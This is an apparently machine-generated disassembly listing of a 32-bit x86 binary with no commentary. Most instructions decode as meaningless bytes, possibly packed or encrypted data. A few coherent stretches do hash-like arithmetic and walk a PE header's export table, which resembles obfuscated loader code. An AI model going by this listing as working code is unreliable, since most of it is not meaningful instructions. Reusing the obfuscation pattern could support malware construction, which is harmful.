  406647:	cmp    eax,0xce90f4b5
  40664c:	dec    ecx
  40664d:	ret    
  40664e:	inc    eax
  40664f:	in     al,0x6c
  406651:	aam    0xa9
  406653:	xchg   BYTE PTR [eax+ebx*4-0xb],al
  406657:	pop    ss
  406658:	out    dx,al
  406659:	mov    ah,0x95
  40665b:	std    
  40665c:	push   ss
  40665d:	fadd   DWORD PTR [eax-0x24415c41]
  406663:	push   esp
  406664:	test   eax,0x9ccaab6c
  406669:	add    edx,esp
  40666b:	add    al,0x18
  40666d:	dec    ecx
  40666e:	dec    ecx
  40666f:	icebp  
  406670:	mov    DWORD PTR ds:0xbbacfb07,ecx
  406676:	(bad)  
  406677:	push   esp
  406678:	mov    edx,DWORD PTR [ebx+0x4]
  40667b:	xor    eax,0xcb79b577
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0x6464920c
  4066b2:	mov    ah,0xcf
  4066b4:	mov    esi,0xbdbebe3b
  4066b9:	les    edi,FWORD PTR [esi-0x6fa18142]
  4066bf:	rcl    DWORD PTR [edi-0xf],0x39
  4066c3:	pop    esi
  4066c4:	jne    0x40673d
  4066c6:	int    0x44
  4066c8:	jne    0x4066c8
  4066ca:	pop    ebp
  4066cb:	jp     0x406705
  4066cd:	cwde   
  4066ce:	pop    edx
  4066cf:	stc    
  4066d0:	dec    ebp
  4066d1:	test   eax,0xee89fcde
  4066d6:	dec    ebp
  4066d7:	ins    BYTE PTR es:[edi],dx
  4066d8:	retf   
  4066d9:	cmp    ch,BYTE PTR [edi-0x57b7f5e3]
  4066df:	mov    al,ds:0x8139988a
  4066e4:	push   ds
  4066e5:	aaa    
  4066e6:	sahf   
  4066e7:	xor    cl,dh
  4066e9:	imul   esi,DWORD PTR [ecx],0xffffffa8
  4066ec:	nop
  4066ed:	loop   0x4066a9
  4066ef:	adc    dl,cl
  4066f1:	mov    al,BYTE PTR [esi]
  4066f3:	cld    
  4066f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066f5:	push   eax
  4066f6:	xor    BYTE PTR [ebp-0x39967a6],0xc1
  4066fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066fe:	cmp    al,BYTE PTR [esi]
  406700:	das    
  406701:	jle    0x4066d4
  406703:	jmp    0x8be8:0x707af467
  40670a:	nop
  40670b:	repnz mov bl,BYTE PTR [ebx+eax*2+0x4dba2f3b]
  406713:	fwait
  406714:	pop    eax
  406715:	xchg   esp,eax
  406716:	push   0x80664a74
  40671b:	pop    ebx
  40671c:	mov    eax,0x5542d68
  406721:	pop    edi
  406722:	xor    al,0xa3
  406724:	xchg   edx,eax
  406725:	add    esi,DWORD PTR ds:0xe2cc9299
  40672b:	fsub   QWORD PTR [esi-0x55]
  40672e:	add    DWORD PTR [ebp-0x58],esp
  406731:	cmp    ebp,0x1a
  406734:	xchg   edx,eax
  406735:	sbb    edx,DWORD PTR [ebp+0x62e44f7b]
  40673b:	stc    
  40673c:	adc    BYTE PTR [edi+0x2b],0xc4
  406740:	inc    ebp
  406741:	scas   al,BYTE PTR es:[edi]
  406742:	push   ebx
  406743:	in     al,0x79
  406745:	outs   dx,BYTE PTR ds:[esi]
  406746:	into   
  406747:	pop    edx
  406748:	and    BYTE PTR [eax-0x40],0x9e
  40674c:	bound  eax,QWORD PTR [ebx-0x3f]
  40674f:	cmp    al,BYTE PTR [edi+0x438dd96b]
  406755:	and    eax,DWORD PTR [edx+ebx*2]
  406758:	je     0x406712
  40675a:	fcmove st,st(7)
  40675c:	outs   dx,DWORD PTR ds:[esi]
  40675d:	je     0x406798
  40675f:	sbb    eax,edi
  406761:	fcomp  st(0)
  406763:	dec    eax
  406764:	call   0xbb30:0xe3754b5e
  40676b:	into   
  40676c:	sbb    eax,0xc6d8fef7
  406771:	ds scas al,BYTE PTR es:[edi]
  406773:	pop    ecx
  406774:	sbb    al,0xd4
  406776:	addr16 pop es
  406778:	jg     0x4067f5
  40677a:	pusha  
  40677b:	push   ds
  40677c:	push   0x25
  40677e:	pop    ebx
  40677f:	jmp    0x4ce9:0xd87a763d
  406786:	and    dh,BYTE PTR [edx]
  406788:	add    DWORD PTR [edi],edx
  40678a:	inc    edx
  40678b:	(bad)  
  40678c:	cmp    BYTE PTR [edx-0x33],ch
  40678f:	fwait
  406790:	push   0x7a
  406792:	and    DWORD PTR [edi*4+0x3f17620e],eax
  406799:	push   ss
  40679a:	imul   ebx,DWORD PTR [edx],0xf86ca99e
  4067a0:	add    DWORD PTR [eax+0x73],esi
  4067a3:	pop    edx
  4067a4:	and    ch,BYTE PTR [eax]
  4067a6:	repz adc eax,0x922113cb
  4067ac:	aas    
  4067ad:	enter  0xad56,0x53
  4067b1:	outs   dx,DWORD PTR ds:[esi]
  4067b2:	add    bh,al
  4067b4:	jns    0x406789
  4067b6:	(bad)  
  4067b7:	cdq    
  4067b8:	xlat   BYTE PTR ds:[ebx]
  4067b9:	sub    al,0xda
  4067bb:	outs   dx,BYTE PTR ds:[esi]
  4067bc:	ja     0x40680d
  4067be:	or     edi,0xe4d7f799
  4067c4:	mov    ah,0xb
  4067c6:	mov    ecx,0xd1b34109
  4067cb:	test   BYTE PTR [edi],al
  4067cd:	pop    edi
  4067ce:	mov    esi,0x10c62c4c
  4067d3:	and    BYTE PTR [ebx+eiz*1-0x28],dh
  4067d7:	lea    eax,[ecx-0x60]
  4067da:	xor    ebp,edi
  4067dc:	jo     0x4067b6
  4067de:	sahf   
  4067df:	retf   0xdf7
  4067e2:	rcr    BYTE PTR [eax+eiz*8+0x74],0x1f
  4067e7:	fisttp WORD PTR [esi+0x5f463399]
  4067ed:	or     ebp,DWORD PTR [ebp+eax*8-0x4c]
  4067f1:	pop    ds
  4067f2:	arpl   WORD PTR ds:0xf5e8a249,di
  4067f8:	push   esi
  4067f9:	sbb    al,0x8f
  4067fb:	inc    esp
  4067fc:	div    DWORD PTR [ecx+eiz*8]
  4067ff:	stc    
  406800:	push   ecx
  406801:	push   ds
  406802:	shr    DWORD PTR [esi+0x4],cl
  406805:	xchg   ebp,eax
  406806:	aaa    
  406807:	bound  edi,QWORD PTR [ebx+0x53e1e82]
  40680d:	sahf   
  40680e:	or     ecx,DWORD PTR [eax]
  406810:	xor    eax,0x5fa52ee0
  406815:	ss pop ebx
  406817:	or     BYTE PTR [eax-0x64],bh
  40681a:	pop    ecx
  40681b:	cdq    
  40681c:	adc    DWORD PTR [eax-0x27],eax
  40681f:	or     esp,ecx
  406821:	push   esi
  406822:	mov    ebx,ecx
  406824:	fdiv   DWORD PTR [eax+eiz*2-0x5a0db85e]
  40682b:	(bad)  
  40682c:	inc    bl
  40682e:	fist   WORD PTR [ebx+ebp*4]
  406831:	popa   
  406832:	or     DWORD PTR [eax-0x55],0xffffffeb
  406836:	lods   al,BYTE PTR ds:[esi]
  406837:	ffreep st(0)
  406839:	sbb    eax,0x866e9803
  40683e:	clc    
  40683f:	stc    
  406840:	retf   
  406841:	dec    esp
  406842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406843:	sbb    DWORD PTR [ebx-0x77],0xffffffd4
  406847:	push   ss
  406848:	jb     0x4067f1
  40684a:	inc    DWORD PTR [eax]
  40684c:	mov    ah,0x6b
  40684e:	jbe    0x406818
  406850:	cmp    ah,BYTE PTR [ebp+ecx*2+0x6b9d12fc]
  406857:	jno    0x4067ed
  406859:	add    eax,0x7555094a
  40685e:	jl     0x406856
  406860:	cmp    bh,BYTE PTR [edx-0x4ac8391b]
  406866:	xchg   edx,eax
  406867:	xor    BYTE PTR [edi-0x36],0x67
  40686b:	push   0xffffffea
  40686d:	push   es
  40686e:	in     eax,0x94
  406870:	sti    
  406871:	pop    esi
  406872:	jmp    0x89a7:0x329ec859
  406879:	ror    BYTE PTR [edx+ecx*4],0xf5
  40687d:	dec    eax
  40687e:	push   cs
  40687f:	push   ds
  406880:	nop
  406881:	mov    esi,0xf6b8101e
  406886:	sbb    edx,DWORD PTR [eax]
  406888:	mov    ecx,0xc9c9ddac
  40688d:	sbb    eax,0x5b1b3dbc
  406892:	xor    eax,0x68dd0267
  406897:	out    dx,al
  406898:	ins    DWORD PTR es:[edi],dx
  406899:	hlt    
  40689a:	add    BYTE PTR [eax-0x41],bh
  40689d:	retf   
  40689e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40689f:	cmp    esi,DWORD PTR [edx+0x7b20ee5a]
  4068a5:	js     0x406926
  4068a7:	aam    0x30
  4068a9:	cld    
  4068aa:	lock adc ch,BYTE PTR [esi+0x5fcec2c1]
  4068b1:	imul   ecx,DWORD PTR [ebx],0xffffffb8
  4068b4:	mov    ds:0x59a105bb,eax
  4068b9:	xor    ebx,DWORD PTR [ecx+0x19e969b7]
  4068bf:	pop    esi
  4068c0:	xchg   edi,ebp
  4068c2:	push   cs
  4068c3:	push   0x6bf3e8c9
  4068c8:	mov    cl,0xea
  4068ca:	add    BYTE PTR [ebx],dh
  4068cc:	cwde   
  4068cd:	retf   0x3c13
  4068d0:	ds push ebx
  4068d2:	adc    al,0x89
  4068d4:	je     0x40694a
  4068d6:	loopne 0x40689f
  4068d8:	or     esp,DWORD PTR [eax]
  4068da:	jp     0x3b68a2f1
  4068e0:	std    
  4068e1:	nop
  4068e2:	mov    ds:0xf84a7689,al
  4068e7:	xchg   ecx,eax
  4068e8:	(bad)
  4068ec:	fisttp WORD PTR [edx-0x45]
  4068ef:	sbb    dl,ch
  4068f1:	xchg   ebx,eax
  4068f2:	jge    0x406972
  4068f4:	sar    DWORD PTR [ecx+0x656f00a1],1
  4068fa:	loop   0x406918
  4068fc:	ficomp WORD PTR [ebx+eiz*8-0x50]
  406900:	lock adc eax,0x4241a677
  406906:	push   es
  406907:	fwait
  406908:	push   edx
  406909:	clc    
  40690a:	dec    ebx
  40690b:	fwait
  40690c:	rep lods eax,DWORD PTR ds:[esi]
  40690e:	mov    eax,0x7ffd45ce
  406913:	lock push ebp
  406915:	mov    esi,DWORD PTR [esi+0x4c]
  406918:	mov    ah,0xaa
  40691a:	mov    ds:0xa330bb56,eax
  40691f:	lahf   
  406920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406921:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406923:	imul   ch
  406925:	inc    edi
  406926:	inc    edi
  406927:	(bad)
  40692b:	xor    BYTE PTR ds:0x9f9ee58c,cl
  406931:	arpl   ax,bp
  406933:	xchg   esi,eax
  406934:	sbb    dh,BYTE PTR [esi]
  406936:	mov    dh,0x3
  406938:	mov    cl,0x7d
  40693a:	xchg   DWORD PTR [edx+0x35],ecx
  40693d:	aad    0x8d
  40693f:	mov    bl,0xcb
  406941:	inc    edx
  406942:	inc    ebx
  406943:	jl     0x40696f
  406945:	loope  0x40690b
  406947:	push   ecx
  406948:	mov    eax,ds:0xb689a9c3
  40694d:	dec    ebp
  40694e:	(bad)  [edi]
  406950:	mov    WORD PTR [ebp+0x347229fd],fs
  406956:	cld    
  406957:	lods   eax,DWORD PTR ds:[esi]
  406958:	mov    esi,0x3aa3b600
  40695d:	pop    eax
  40695e:	out    0x9f,eax
  406960:	sbb    eax,0x4760667
  406965:	or     ah,dh
  406967:	or     BYTE PTR [ebx+0x14],ch
  40696a:	test   al,0xf7
  40696c:	rol    BYTE PTR [edi+0xd],0x73
  406970:	pop    ebp
  406971:	sub    ebx,edi
  406973:	loope  0x406981
  406975:	aaa    
  406976:	inc    ebx
  406977:	or     eax,0x9b089a19
  40697c:	jge    0x406993
  40697e:	mov    al,ds:0xffab45c3
  406983:	ret    
  406984:	ja     0x4069f6
  406986:	jl     0x40690f
  406988:	xchg   edi,eax
  406989:	test   BYTE PTR [esp+ebx*4-0x59],bh
  40698d:	out    dx,eax
  40698e:	aaa    
  40698f:	cld    
  406990:	cmp    al,0x70
  406992:	mov    edx,0x6ea8014f
  406997:	sub    BYTE PTR [bx+si+0x1160],bh
  40699c:	and    al,0x88
  40699e:	adc    BYTE PTR [esi-0x15a38a38],ch
  4069a4:	cld    
  4069a5:	leave  
  4069a6:	leave  
  4069a7:	and    BYTE PTR [esi],cl
  4069a9:	push   0xc03d9fa0
  4069ae:	inc    eax
  4069af:	xchg   DWORD PTR [edx*2+0x630b74f7],ebx
  4069b6:	cmp    cl,BYTE PTR [esp+eiz*2]
  4069b9:	adc    ebx,DWORD PTR [edi]
  4069bb:	enter  0x5eab,0x37
  4069bf:	cdq    
  4069c0:	adc    eax,0x5f0cda8a
  4069c5:	aas    
  4069c6:	jno    0x4069aa
  4069c8:	mov    DWORD PTR [esi],ebp
  4069ca:	ret    0x99cd
  4069cd:	std    
  4069ce:	push   ss
  4069cf:	push   es
  4069d0:	xorps  xmm7,XMMWORD PTR [ebp-0x1b]
  4069d4:	dec    ebx
  4069d5:	in     al,dx
  4069d6:	jge    0x4069be
  4069d8:	mov    ebp,0xb996aabb
  4069dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069de:	jnp    0x40698c
  4069e0:	std    
  4069e1:	dec    eax
  4069e2:	fnsave [ecx-0x5d]
  4069e5:	(bad)  
  4069e6:	pop    ebx
  4069e7:	mov    cl,0x60
  4069e9:	xchg   ebx,eax
  4069ea:	jle    0x4069a6
  4069ec:	sub    al,0xf9
  4069ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069ef:	repz cs adc al,0xb3
  4069f3:	lods   al,BYTE PTR ds:[esi]
  4069f4:	xchg   edx,eax
  4069f5:	mov    esp,0xcd99fc5e
  4069fa:	cmp    al,0xcc
  4069fc:	retf   0xac62
  4069ff:	aad    0x56
  406a01:	push   0x18
  406a03:	dec    eax
  406a04:	mov    ah,0x44
  406a06:	sar    esi,1
  406a08:	jg     0x406a4b
  406a0a:	push   cs
  406a0b:	fadd   QWORD PTR [ecx]
  406a0d:	rol    eax,1
  406a0f:	pop    ss
  406a10:	mov    ebp,esp
  406a12:	push   edi
  406a13:	jmp    0x406a20
  406a15:	inc    DWORD PTR [edx]
  406a17:	retf   0x2294
  406a1a:	dec    esi
  406a1b:	push   ecx
  406a1c:	push   edi
  406a1d:	int3   
  406a1e:	push   ss
  406a1f:	test   BYTE PTR [ecx+0x6],bl
  406a22:	test   al,0x8f
  406a24:	popf   
  406a25:	jae    0x4069c9
  406a27:	push   edi
  406a28:	fcomp  st(1)
  406a2a:	outs   dx,DWORD PTR ds:[esi]
  406a2b:	jne    0x406a43
  406a2d:	sbb    ebx,DWORD PTR [ebx]
  406a2f:	inc    eax
  406a30:	dec    ecx
  406a31:	xchg   edx,eax
  406a32:	repz (bad) 
  406a34:	ficomp WORD PTR [ecx]
  406a36:	dec    ebx
  406a37:	dec    esp
  406a38:	or     eax,0xc8fb7ac0
  406a3d:	test   BYTE PTR [edx+0x28],bh
  406a40:	mov    DWORD PTR [ebp-0x6c],eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	(bad)  
  406abf:	pop    esi
  406ac0:	sahf   
  406ac1:	mov    ebp,0xbdbebe41
  406ac6:	les    edi,FWORD PTR [esi+0x459898be]
  406acc:	mov    ebx,esp
  406ace:	add    al,BYTE PTR [ecx-0x71de2197]
  406ad4:	data16 cmp BYTE PTR [edx-0x8d9fe84],dl
  406adb:	inc    edi
  406adc:	stc    
  406add:	loop   0x406ac3
  406adf:	cmp    al,0x92
  406ae1:	(bad)  [esi+0x14]
  406ae4:	or     al,0x4
  406ae6:	pop    sp
  406ae8:	mov    dh,0xd9
  406aea:	inc    ebx
  406aeb:	je     0x406b1c
  406aed:	or     eax,0x460ff3d5
  406af2:	dec    eax
  406af3:	out    0x85,al
  406af5:	or     eax,0x66012051
  406afa:	fmul   DWORD PTR [eax+0x196c923b]
  406b00:	jb     0x406aa3
  406b02:	mov    esi,?
  406b04:	or     BYTE PTR [ecx-0x39],bl
  406b07:	ds in  eax,0xb8
  406b0a:	cmc    
  406b0b:	pop    ebp
  406b0c:	adc    al,0xa4
  406b0e:	ins    BYTE PTR es:[edi],dx
  406b0f:	fs ins BYTE PTR es:[edi],dx
  406b11:	ror    edx,1
  406b13:	jae    0x406b34
  406b15:	ja     0x406ada
  406b17:	loop   0x406ae6
  406b19:	pop    ecx
  406b1a:	add    esi,esi
  406b1c:	mov    ebx,0xc45efda8
  406b21:	jae    0x406b84
  406b23:	rcl    DWORD PTR [ebp-0x187b354a],1
  406b29:	sti    
  406b2a:	mov    al,0x7b
  406b2c:	cmc    
  406b2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b2e:	cmp    bl,dl
  406b30:	inc    ebx
  406b31:	lahf   
  406b32:	das    
  406b33:	or     BYTE PTR [edx+0x61],dh
  406b36:	das    
  406b37:	neg    BYTE PTR [esi+0x2c]
  406b3a:	sub    eax,0x3e664ec7
  406b3f:	xor    al,0x83
  406b41:	push   esp
  406b42:	mov    esi,0xe2a5d943
  406b47:	pop    es
  406b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b49:	sub    eax,0xc9d35ceb
  406b4e:	sbb    al,0x16
  406b50:	lds    edx,FWORD PTR [ecx+ebx*2+0x32]
  406b54:	mov    WORD PTR [eax-0x13b8b17a],?
  406b5a:	cmp    BYTE PTR [eax],cl
  406b5c:	fyl2xp1 
  406b5e:	pop    edi
  406b5f:	jae    0x406b49
  406b61:	fadd   QWORD PTR [edx-0x3a]
  406b64:	leave  
  406b65:	sbb    DWORD PTR [ebx-0x2d],edi
  406b68:	cwde   
  406b69:	pop    ebp
  406b6a:	inc    esp
  406b6b:	add    eax,0x30180b5b
  406b70:	neg    DWORD PTR [edx-0x18a8b2b6]
  406b76:	inc    esi
  406b77:	dec    edx
  406b78:	cmp    esp,0x15
  406b7b:	pushf  
  406b7c:	jns    0x406bbb
  406b7e:	mov    ebx,0x3538cc76
  406b83:	pusha  
  406b84:	in     al,0x7b
  406b86:	into   
  406b87:	popf   
  406b88:	ins    BYTE PTR es:[edi],dx
  406b89:	out    0xec,al
  406b8b:	xchg   ebx,eax
  406b8c:	or     BYTE PTR [esi-0x28152d47],dl
  406b92:	inc    ebp
  406b93:	xor    DWORD PTR [esi+0x6e57e20a],ecx
  406b99:	jno    0x406b70
  406b9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b9c:	std    
  406b9d:	stc    
  406b9e:	jmp    0xeb6f25e
  406ba3:	push   ebp
  406ba4:	inc    ecx
  406ba5:	icebp  
  406ba6:	test   DWORD PTR [edi-0x7a4190a1],ecx
  406bac:	retf   0xd9c9
  406baf:	fiadd  DWORD PTR [eax-0x5cb46b8e]
  406bb5:	adc    bh,BYTE PTR [ecx-0x37]
  406bb8:	adc    esp,0xff34915b
  406bbe:	and    BYTE PTR [ebp+eiz*1+0x2c3d7e77],cl
  406bc5:	or     eax,0xcc7f63ae
  406bca:	pop    ss
  406bcb:	fild   WORD PTR [esi+0x3e]
  406bce:	cmp    esi,ebp
  406bd0:	mov    DWORD PTR [esi],ecx
  406bd2:	outs   dx,BYTE PTR ds:[esi]
  406bd3:	dec    ecx
  406bd4:	or     dh,BYTE PTR [edi+0x17dc5d35]
  406bda:	add    DWORD PTR [ecx],ecx
  406bdc:	clc    
  406bdd:	dec    edx
  406bde:	out    0xa,eax
  406be0:	sahf   
  406be1:	jl     0x406bde
  406be3:	cdq    
  406be4:	push   esp
  406be5:	das    
  406be6:	ins    BYTE PTR es:[edi],dx
  406be7:	inc    esp
  406be8:	call   FWORD PTR ss:[edx]
  406beb:	cmp    BYTE PTR [ebp-0x456a646b],dl
  406bf1:	adc    eax,0xc5e9b606
  406bf6:	pop    eax
  406bf7:	mov    edx,0xa4a0d028
  406bfc:	cmp    cl,bh
  406bfe:	ins    DWORD PTR es:[edi],dx
  406bff:	xchg   ebx,eax
  406c00:	inc    esp
  406c01:	adc    al,ah
  406c03:	push   0x8197b4f7
  406c08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c09:	es dec ecx
  406c0b:	adc    DWORD PTR [ebx+0x6ac426f0],ebp
  406c11:	xchg   edi,eax
  406c12:	repz cmp DWORD PTR gs:0x98ec2c92,ebx
  406c1a:	mov    bh,0xe1
  406c1c:	test   al,0x6
  406c1e:	scas   eax,DWORD PTR es:[edi]
  406c1f:	push   cs
  406c20:	lock jno 0x406c2a
  406c23:	clc    
  406c24:	sahf   
  406c25:	jnp    0x406bd8
  406c27:	push   ds
  406c28:	add    bl,BYTE PTR [edi-0x49488b1c]
  406c2e:	sbb    eax,0xd132e56f
  406c33:	mov    ds:0x885a7065,eax
  406c38:	jne    0x406c4e
  406c3a:	or     ecx,ebp
  406c3c:	in     al,0xfa
  406c3e:	fdivr  DWORD PTR [edi+edx*1+0x2f]
  406c42:	outs   dx,DWORD PTR ds:[esi]
  406c43:	scas   al,BYTE PTR es:[edi]
  406c44:	cli    
  406c45:	or     cl,BYTE PTR [edi+0x30]
  406c48:	pop    edi
  406c49:	lea    eax,[edx]
  406c4b:	mul    DWORD PTR [esi]
  406c4d:	adc    ecx,esi
  406c4f:	jno    0x406cc9
  406c51:	das    
  406c52:	les    esp,FWORD PTR [eax-0x6d]
  406c55:	push   ecx
  406c56:	adc    dl,BYTE PTR ds:0x486a8787
  406c5c:	and    BYTE PTR [edx],dl
  406c5e:	sub    edi,esp
  406c60:	pushf  
  406c61:	pop    esi
  406c62:	inc    ebx
  406c63:	sahf   
  406c64:	inc    edi
  406c65:	pop    eax
  406c66:	aas    
  406c67:	or     al,0x6d
  406c69:	jno    0x406cd8
  406c6b:	arpl   WORD PTR [edi+0x44c9623],ax
  406c71:	mov    ss,WORD PTR ds:0x8ed106a6
  406c77:	xor    BYTE PTR [edx+0x69],ah
  406c7a:	lods   al,BYTE PTR ds:[esi]
  406c7b:	add    BYTE PTR [eax-0x79],0x1d
  406c7f:	scas   eax,DWORD PTR es:[edi]
  406c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c81:	(bad)  [eax-0x63ba9c71]
  406c87:	ret    
  406c88:	mov    eax,ds:0x3071fb9a
  406c8d:	fwait
  406c8e:	pop    ss
  406c8f:	sbb    al,0xc7
  406c91:	out    dx,al
  406c92:	lods   eax,DWORD PTR ds:[esi]
  406c93:	mov    ?,WORD PTR [esi+0x4c]
  406c96:	push   ebp
  406c97:	mov    WORD PTR [edi+ebp*8],fs
  406c9a:	lds    esp,FWORD PTR [esi]
  406c9c:	iret   
  406c9d:	cmp    eax,0x948f586b
  406ca2:	hlt    
  406ca3:	pop    ebx
  406ca4:	xchg   DWORD PTR [ebp-0x66641c8c],esp
  406caa:	std    
  406cab:	ret    0x173d
  406cae:	rcl    BYTE PTR [esi-0x3056f190],1
  406cb4:	sbb    ah,BYTE PTR [ecx+0x21]
  406cb7:	dec    eax
  406cb8:	mov    esi,0x6d83bf7e
  406cbd:	stc    
  406cbe:	mov    bl,0x44
  406cc0:	jnp    0x406cd5
  406cc2:	mov    bl,0x64
  406cc4:	xchg   edx,eax
  406cc5:	shl    DWORD PTR [edi+0x4b],0x39
  406cc9:	sub    al,BYTE PTR [ebx+0x4d082698]
  406ccf:	adc    al,0xa2
  406cd1:	fdivp  st(7),st
  406cd3:	aas    
  406cd4:	xor    dl,BYTE PTR [ebp+0x5da2344]
  406cda:	pop    edx
  406cdb:	xor    eax,eax
  406cdd:	jnp    0x406ca7
  406cdf:	shr    dh,1
  406ce1:	and    esi,DWORD PTR [eax]
  406ce3:	inc    ebp
  406ce4:	out    0xb3,eax
  406ce6:	outs   dx,DWORD PTR ds:[esi]
  406ce7:	rcr    DWORD PTR [ebx-0x33543214],0xb3
  406cee:	sub    eax,0xd5731273
  406cf3:	dec    edx
  406cf4:	(bad)  
  406cf5:	jmp    0xc32f9988
  406cfa:	add    eax,0x873414ab
  406cff:	shr    BYTE PTR [ecx],cl
  406d01:	std    
  406d02:	xchg   ecx,eax
  406d03:	or     eax,0x6e6c2f70
  406d08:	sbb    esi,ecx
  406d0a:	outs   dx,DWORD PTR ds:[esi]
  406d0b:	scas   eax,DWORD PTR es:[edi]
  406d0c:	push   0xc494057c
  406d11:	or     DWORD PTR [ebx+0xd],edx
  406d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d15:	scas   eax,DWORD PTR es:[edi]
  406d16:	pop    esi
  406d17:	in     eax,0x16
  406d19:	jg     0x406cc4
  406d1b:	ja     0x406d54
  406d1d:	xchg   esp,eax
  406d1e:	pushf  
  406d1f:	sub    cl,BYTE PTR [ecx+eax*4-0x1c]
  406d23:	pop    eax
  406d24:	cmp    eax,0xc809675
  406d29:	(bad)  
  406d2a:	and    esi,esi
  406d2c:	in     eax,0x93
  406d2e:	jns    0x406cf7
  406d30:	jge    0x406d1d
  406d32:	mov    ecx,0x26693b8
  406d37:	xor    BYTE PTR [esi+0x7c0a848a],bh
  406d3d:	and    BYTE PTR [ebx+0x1514330b],cl
  406d43:	inc    esp
  406d44:	pushf  
  406d45:	pop    ds
  406d46:	popa   
  406d47:	mov    ebx,0x7edaf92d
  406d4c:	fisubr DWORD PTR [ecx-0x14974c8b]
  406d52:	jno    0x406d41
  406d54:	inc    esp
  406d55:	push   ebp
  406d56:	call   0x148e90a4
  406d5b:	jno    0x406ddb
  406d5d:	add    DWORD PTR [ebp-0x8],ebp
  406d60:	out    0xeb,eax
  406d62:	and    DWORD PTR [eax+0x7c],edi
  406d65:	cmc    
  406d66:	ins    DWORD PTR es:[edi],dx
  406d67:	push   edi
  406d68:	bound  ebx,QWORD PTR [ebx+0x35]
  406d6b:	addr16 int3 
  406d6d:	aam    0x49
  406d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d70:	cli    
  406d71:	jecxz  0x406d5f
  406d73:	popa   
  406d74:	rcl    edx,1
  406d76:	mov    ch,0xda
  406d78:	les    ebx,FWORD PTR ds:0xa0c8e7ce
  406d7e:	popa   
  406d7f:	mov    bh,0x61
  406d81:	fistp  QWORD PTR [eax-0x48]
  406d84:	out    0x43,al
  406d86:	inc    esi
  406d87:	sbb    al,0x70
  406d89:	cmp    eax,eax
  406d8b:	inc    ecx
  406d8c:	hlt    
  406d8d:	mov    ecx,0x7e86b0c5
  406d92:	cmp    bh,BYTE PTR [ebp+0x62]
  406d95:	test   al,0xc2
  406d97:	shl    BYTE PTR [eax],cl
  406d99:	(bad)  
  406d9a:	ror    BYTE PTR cs:[esi],cl
  406d9d:	jae    0x406d71
  406d9f:	add    edx,edi
  406da1:	call   0xc547:0x6e584a1b
  406da8:	push   eax
  406da9:	xchg   DWORD PTR [edi-0x72],edi
  406dac:	aas    
  406dad:	add    al,0x9b
  406daf:	ja     0x406e0b
  406db1:	pop    ebp
  406db2:	mov    esp,DWORD PTR [esi+0x7c397c4b]
  406db8:	cld    
  406db9:	fs ret 0x8a9b
  406dbd:	out    0x8f,al
  406dbf:	sahf   
  406dc0:	add    al,BYTE PTR [edx]
  406dc2:	or     BYTE PTR [esi],cl
  406dc4:	das    
  406dc5:	imul   ecx,DWORD PTR [edx-0x4a4a9c50],0x33
  406dcc:	mul    al
  406dce:	jbe    0x291f9d03
  406dd4:	push   ebx
  406dd5:	sahf   
  406dd6:	sar    DWORD PTR [esi],1
